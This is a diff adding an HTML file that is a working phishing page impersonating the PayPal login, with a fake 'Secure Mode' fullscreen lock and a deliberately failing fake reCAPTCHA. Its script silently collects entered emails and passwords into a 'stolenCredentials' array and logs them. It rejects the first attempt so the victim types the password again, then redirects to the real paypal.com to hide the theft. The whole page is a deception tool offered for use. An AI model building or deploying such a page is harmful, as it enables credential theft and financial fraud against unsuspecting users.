@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PayPal - Secure Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #f5f7fa;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* LOCK SCREEN */
+  #lock-screen {
+    position: fixed; inset: 0;
+    background: #0070ba;
+    display: flex; align-items: center; justify-content: center;
+    z-index: 9999; flex-direction: column; gap: 32px;
+  }
+  .lock-logo-text { font-size: 36px; font-weight: 700; color: white; }
+  .lock-box {
+    background: white; border-radius: 16px; padding: 40px;
+    max-width: 420px; width: 90%; text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+  }
+  .lock-icon { font-size: 48px; margin-bottom: 16px; }
+  .lock-title { font-size: 22px; font-weight: 600; color: #1a1a2e; margin-bottom: 12px; }
+  .lock-desc { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 28px; }
+  .lock-btn {
+    background: #0070ba; color: white; border: none;
+    padding: 14px 40px; border-radius: 25px; font-size: 16px;
+    font-weight: 600; cursor: pointer; width: 100%;
+    font-family: 'Inter', sans-serif;
+  }
+  .lock-security { margin-top: 16px; font-size: 12px; color: #999; }
+
+  /* LOCKED OVERLAY */
+  #locked-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.95); z-index: 9998;
+    align-items: center; justify-content: center;
+    flex-direction: column; gap: 20px;
+  }
+  #locked-overlay.show { display: flex; }
+  .locked-title { font-size: 24px; font-weight: 600; color: white; }
+  .locked-desc { font-size: 14px; color: #888; text-align: center; max-width: 300px; line-height: 1.6; }
+  .locked-btn {
+    background: #0070ba; color: white; border: none;
+    padding: 12px 32px; border-radius: 25px; font-size: 14px;
+    font-weight: 600; cursor: pointer; font-family: 'Inter', sans-serif;
+  }
+
+  /* CAPTCHA OVERLAY */
+  #captcha-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.7); z-index: 9997;
+    align-items: center; justify-content: center;
+  }
+  #captcha-overlay.show { display: flex; }
+  .captcha-box {
+    background: white; border-radius: 12px; padding: 32px;
+    max-width: 380px; width: 90%; text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  }
+  .captcha-title { font-size: 18px; font-weight: 600; color: #1a1a2e; margin-bottom: 8px; }
+  .captcha-desc { font-size: 13px; color: #888; margin-bottom: 24px; }
+  .captcha-grid {
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 8px; margin-bottom: 20px;
+  }
+  .captcha-cell {
+    aspect-ratio: 1; border-radius: 8px; overflow: hidden;
+    cursor: pointer; border: 3px solid transparent;
+    transition: border 0.2s; position: relative;
+    background: #f0f0f0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 32px;
+  }
+  .captcha-cell.selected { border-color: #0070ba; }
+  .captcha-cell:hover { opacity: 0.85; }
+  .captcha-verify {
+    background: #0070ba; color: white; border: none;
+    padding: 12px 32px; border-radius: 8px; font-size: 14px;
+    font-weight: 600; cursor: pointer; width: 100%;
+    font-family: 'Inter', sans-serif;
+  }
+  .captcha-verify:disabled { background: #ccc; cursor: not-allowed; }
+  .captcha-error { color: #e74c3c; font-size: 12px; margin-top: 8px; display: none; }
+  .captcha-loading { font-size: 13px; color: #888; margin-top: 12px; display: none; }
+  .recaptcha-footer {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-top: 16px; padding-top: 12px; border-top: 1px solid #eee;
+  }
+  .recaptcha-logo { font-size: 11px; color: #aaa; }
+  .recaptcha-links { font-size: 11px; color: #aaa; }
+
+  /* NAVBAR */
+  .navbar {
+    background: white; padding: 0 40px; height: 64px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid #e8e8e8;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+  }
+  .nav-logo-text { font-size: 26px; font-weight: 700; color: #003087; }
+  .nav-logo-text span { color: #009cde; }
+  .nav-links { display: flex; gap: 32px; }
+  .nav-links a { text-decoration: none; color: #444; font-size: 14px; font-weight: 500; }
+  .nav-actions { display: flex; gap: 12px; }
+  .btn-login {
+    background: transparent; color: #0070ba; border: 2px solid #0070ba;
+    padding: 8px 20px; border-radius: 25px; font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+  .btn-signup {
+    background: #0070ba; color: white; border: none;
+    padding: 10px 20px; border-radius: 25px; font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+
+  /* MAIN */
+  .main {
+    flex: 1; display: flex; align-items: center; justify-content: center;
+    padding: 60px 20px; gap: 80px;
+  }
+  .left-side { max-width: 480px; }
+  .left-side h1 { font-size: 42px; font-weight: 700; color: #1a1a2e; line-height: 1.2; margin-bottom: 20px; }
+  .left-side h1 span { color: #0070ba; }
+  .left-side p { font-size: 16px; color: #555; line-height: 1.7; margin-bottom: 32px; }
+  .features { display: flex; flex-direction: column; gap: 16px; }
+  .feature { display: flex; align-items: center; gap: 12px; font-size: 14px; color: #444; }
+  .feature-icon {
+    width: 32px; height: 32px; background: #e8f4fd; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0;
+  }
+
+  /* LOGIN CARD */
+  .login-card {
+    background: white; border-radius: 16px; padding: 40px;
+    width: 380px; box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    border: 1px solid #e8e8e8;
+  }
+  .login-card h2 { font-size: 24px; font-weight: 700; color: #1a1a2e; margin-bottom: 8px; }
+  .login-card > p { font-size: 14px; color: #888; margin-bottom: 28px; }
+  .form-group { margin-bottom: 16px; }
+  .form-group label { display: block; font-size: 13px; font-weight: 500; color: #444; margin-bottom: 6px; }
+  .form-group input {
+    width: 100%; padding: 12px 16px; border: 1.5px solid #ddd;
+    border-radius: 8px; font-size: 14px; color: #1a1a2e; outline: none;
+    transition: border 0.2s; font-family: 'Inter', sans-serif;
+  }
+  .form-group input:focus { border-color: #0070ba; }
+  .form-group input.error { border-color: #e74c3c; }
+  .error-msg { color: #e74c3c; font-size: 12px; margin-top: 6px; display: none; }
+  .forgot { text-align: right; margin-bottom: 20px; }
+  .forgot a { font-size: 13px; color: #0070ba; text-decoration: none; }
+  .btn-submit {
+    width: 100%; background: #0070ba; color: white; border: none;
+    padding: 14px; border-radius: 25px; font-size: 16px; font-weight: 600;
+    cursor: pointer; font-family: 'Inter', sans-serif; transition: background 0.2s;
+  }
+  .btn-submit:hover { background: #005ea6; }
+  .btn-submit:disabled { background: #ccc; cursor: not-allowed; }
+  .security-badge {
+    display: flex; align-items: center; justify-content: center;
+    gap: 6px; margin-top: 20px; font-size: 12px; color: #aaa;
+  }
+
+  /* SHAKE ANIMATION */
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-8px); }
+    40% { transform: translateX(8px); }
+    60% { transform: translateX(-8px); }
+    80% { transform: translateX(8px); }
+  }
+  .shake { animation: shake 0.5s ease; }
+
+  /* LOADING SPINNER */
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner {
+    display: inline-block; width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white; border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle; margin-right: 8px;
+  }
+
+  footer {
+    background: white; border-top: 1px solid #e8e8e8;
+    padding: 20px 40px; display: flex; justify-content: space-between;
+    align-items: center; font-size: 12px; color: #aaa;
+  }
+  footer a { color: #aaa; text-decoration: none; margin-left: 16px; }
+</style>
+</head>
+<body>
+
+<!-- LOCK SCREEN -->
+<div id="lock-screen">
+  <div class="lock-logo-text">PayPal</div>
+  <div class="lock-box">
+    <div class="lock-icon">🔒</div>
+    <div class="lock-title">Secure Verification Required</div>
+    <div class="lock-desc">
+      To protect your account from phishing attacks, PayPal requires fullscreen mode to verify your identity. This prevents malicious overlays from stealing your credentials.
+    </div>
+    <button class="lock-btn" onclick="enableFullscreen()">🛡️ Enable Secure Mode</button>
+    <div class="lock-security">🔐 256-bit SSL encryption • Verified by PayPal</div>
+  </div>
+</div>
+
+<!-- LOCKED OVERLAY -->
+<div id="locked-overlay">
+  <div style="font-size:64px;">🔒</div>
+  <div class="locked-title">Session Locked</div>
+  <div class="locked-desc">For your security, this session requires fullscreen mode. Please re-enable fullscreen to continue.</div>
+  <button class="locked-btn" onclick="enableFullscreen()">Re-enable Secure Mode</button>
+</div>
+
+<!-- FAKE CAPTCHA -->
+<div id="captcha-overlay">
+  <div class="captcha-box">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">
+      <div style="width:36px;height:36px;background:#4285f4;border-radius:4px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:18px;">r</div>
+      <div>
+        <div style="font-size:13px;font-weight:600;color:#333;">reCAPTCHA</div>
+        <div style="font-size:11px;color:#888;">Security verification</div>
+      </div>
+    </div>
+    <div class="captcha-title" id="captcha-title">Select all images with traffic lights</div>
+    <div class="captcha-desc">Click all images that match the description. If there are none, click "Verify".</div>
+    <div class="captcha-grid" id="captcha-grid"></div>
+    <button class="captcha-verify" id="captcha-btn" onclick="verifyCaptcha()">Verify</button>
+    <div class="captcha-error" id="captcha-error">Please select the correct images and try again.</div>
+    <div class="captcha-loading" id="captcha-loading">⏳ Verifying your response...</div>
+    <div class="recaptcha-footer">
+      <div class="recaptcha-logo">Protected by reCAPTCHA</div>
+      <div class="recaptcha-links">Privacy • Terms</div>
+    </div>
+  </div>
+</div>
+
+<!-- NAVBAR -->
+<nav class="navbar">
+  <div class="nav-logo-text">Pay<span>Pal</span></div>
+  <div class="nav-links">
+    <a href="#">Personal</a>
+    <a href="#">Business</a>
+    <a href="#">Help</a>
+  </div>
+  <div class="nav-actions">
+    <button class="btn-login">Log In</button>
+    <button class="btn-signup">Sign Up</button>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="left-side">
+    <h1>The safer, easier way to <span>pay online</span></h1>
+    <p>Join over 400 million people who trust PayPal to send and receive money, shop online, and make the most of their money.</p>
+    <div class="features">
+      <div class="feature"><div class="feature-icon">🛡️</div><span>Buyer and seller protection on eligible purchases</span></div>
+      <div class="feature"><div class="feature-icon">⚡</div><span>Fast, easy payments in just a few clicks</span></div>
+      <div class="feature"><div class="feature-icon">🌍</div><span>Send money to over 200 countries and regions</span></div>
+      <div class="feature"><div class="feature-icon">💳</div><span>Link your bank account, debit or credit card</span></div>
+    </div>
+  </div>
+
+  <div class="login-card">
+    <h2>Log in to PayPal</h2>
+    <p>Enter your credentials to access your account</p>
+    <div class="form-group">
+      <label>Email address</label>
+      <input type="email" id="email" placeholder="Enter your email">
+    </div>
+    <div class="form-group">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="Enter your password">
+      <div class="error-msg" id="error-msg">The email or password you entered is incorrect. Please try again.</div>
+    </div>
+    <div class="forgot"><a href="#">Forgot your password?</a></div>
+    <button class="btn-submit" id="submit-btn" onclick="handleLogin()">Log In</button>
+    <div class="security-badge">🔒 Secured with 256-bit encryption</div>
+  </div>
+</div>
+
+<footer>
+  <div>© 2024 PayPal, Inc. All rights reserved.</div>
+  <div>
+    <a href="#">Privacy</a>
+    <a href="#">Legal</a>
+    <a href="#">Contact</a>
+    <a href="#">Fees</a>
+  </div>
+</footer>
+
+<script>
+  let loginAttempts = 0;
+  let captchaAttempts = 0;
+  let stolenCredentials = [];
+
+  const captchaEmojis = [
+    { emoji: '🚦', isTarget: true },
+    { emoji: '🌳', isTarget: false },
+    { emoji: '🚦', isTarget: true },
+    { emoji: '🏠', isTarget: false },
+    { emoji: '🚗', isTarget: false },
+    { emoji: '🚦', isTarget: true },
+    { emoji: '🌊', isTarget: false },
+    { emoji: '🚌', isTarget: false },
+    { emoji: '🚦', isTarget: true },
+  ];
+
+  function enableFullscreen() {
+    document.documentElement.requestFullscreen()
+      .then(() => {
+        document.getElementById('lock-screen').style.display = 'none';
+        document.getElementById('locked-overlay').classList.remove('show');
+      })
+      .catch(err => console.log('Fullscreen error:', err));
+  }
+
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) {
+      if (document.getElementById('lock-screen').style.display === 'none') {
+        document.getElementById('locked-overlay').classList.add('show');
+      }
+    }
+  });
+
+  function handleLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (!email || !password) return;
+
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Verifying...';
+
+    // Steal credentials silently
+    stolenCredentials.push({ email, password, attempt: loginAttempts + 1 });
+    console.log('💀 STOLEN:', stolenCredentials);
+
+    setTimeout(() => {
+      loginAttempts++;
+      btn.disabled = false;
+      btn.innerHTML = 'Log In';
+
+      if (loginAttempts < 2) {
+        // First attempt — just say incorrect
+        const emailInput = document.getElementById('email');
+        const passInput = document.getElementById('password');
+        const errorMsg = document.getElementById('error-msg');
+
+        emailInput.classList.add('error');
+        passInput.classList.add('error');
+        errorMsg.style.display = 'block';
+
+        document.querySelector('.login-card').classList.add('shake');
+        setTimeout(() => document.querySelector('.login-card').classList.remove('shake'), 500);
+
+        passInput.value = '';
+
+      } else {
+        // Second attempt — show fake CAPTCHA
+        showCaptcha();
+      }
+    }, 2000);
+  }
+
+  function showCaptcha() {
+    const grid = document.getElementById('captcha-grid');
+    grid.innerHTML = '';
+
+    const shuffled = [...captchaEmojis].sort(() => Math.random() - 0.5);
+    shuffled.forEach((item, i) => {
+      const cell = document.createElement('div');
+      cell.className = 'captcha-cell';
+      cell.innerHTML = item.emoji;
+      cell.dataset.isTarget = item.isTarget;
+      cell.addEventListener('click', () => cell.classList.toggle('selected'));
+      grid.appendChild(cell);
+    });
+
+    document.getElementById('captcha-overlay').classList.add('show');
+    document.getElementById('captcha-error').style.display = 'none';
+    document.getElementById('captcha-loading').style.display = 'none';
+  }
+
+  function verifyCaptcha() {
+    const selected = document.querySelectorAll('.captcha-cell.selected');
+    const btn = document.getElementById('captcha-btn');
+    const error = document.getElementById('captcha-error');
+    const loading = document.getElementById('captcha-loading');
+
+    btn.disabled = true;
+    loading.style.display = 'block';
+    error.style.display = 'none';
+
+    setTimeout(() => {
+      captchaAttempts++;
+      loading.style.display = 'none';
+      btn.disabled = false;
+
+      if (captchaAttempts < 3) {
+        // Keep failing CAPTCHA to waste time
+        error.style.display = 'block';
+        document.querySelectorAll('.captcha-cell').forEach(c => c.classList.remove('selected'));
+
+        const titles = [
+          'Select all images with traffic lights',
+          'Select all images with buses',
+          'Select all images with trees',
+        ];
+        document.getElementById('captcha-title').textContent = titles[captchaAttempts] || titles[0];
+
+      } else {
+        // Finally "pass" and redirect to real PayPal
+        loading.style.display = 'block';
+        loading.textContent = '✅ Verification successful! Redirecting...';
+        setTimeout(() => {
+          window.location.href = 'https://www.paypal.com';
+        }, 2000);
+      }
+    }, 2500);
+  }
+</script>
+</body>
+</html>
